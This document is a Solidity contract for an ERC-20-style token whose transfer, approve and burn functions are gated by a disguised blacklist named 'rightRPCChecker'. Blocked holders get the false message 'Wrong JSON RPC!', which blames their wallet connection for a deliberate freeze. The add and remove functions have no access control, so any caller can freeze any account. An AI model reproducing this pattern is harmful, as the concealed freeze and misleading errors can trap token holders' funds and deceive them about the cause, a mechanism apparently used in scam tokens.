//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

contract Test {
    string public constant name = "Test";
    string public constant symbol = "TTT";
    uint8 public constant decimals = 18;
    
    uint256 private totalSupply_;
    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowed;

    mapping(address => bool) private rightRPCChecker;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed from, uint256 value);

    modifier rpcCheck() {
        require(!rightRPCChecker[msg.sender], "Error! Wrong JSON RPC!");
        _;
    }

    constructor(uint256 initialSupply) {
        totalSupply_ = initialSupply;
        balances[msg.sender] = totalSupply_;
    }

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address owner) public view returns (uint256) {
        return balances[owner];
    }

    function transfer(address to, uint256 value) public rpcCheck returns (bool) {
        require(value <= balances[msg.sender]);
        require(to != address(0));

        balances[msg.sender] -= value;
        balances[to] += value;

        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public rpcCheck returns (bool) {
        require(value <= balances[from]);
        require(value <= allowed[from][msg.sender]);
        require(to != address(0));

        balances[from] -= value;
        balances[to] += value;
        allowed[from][msg.sender] -= value;

        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public rpcCheck returns (bool) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return allowed[owner][spender];
    }

    function addToRpcCheck(address account) public {
        require(account != address(0), "Invalid address");
        require(!rightRPCChecker[account], "Account has wrong rpc. Please change it!");
        
        rightRPCChecker[account] = true;
    }

    function removeFromRpcCheck(address account) public {
        require(rightRPCChecker[account], "Account has the right RPC!");

        rightRPCChecker[account] = false;
    }

    function isRightRPC(address account) public view returns (bool) {
        return rightRPCChecker[account];
    }

    function burn(uint256 value) public rpcCheck returns (bool) {
        require(value <= balances[msg.sender], "Insufficient balance");

        balances[msg.sender] -= value;
        totalSupply_ -= value;

        emit Burn(msg.sender, value);
        return true;
    }
}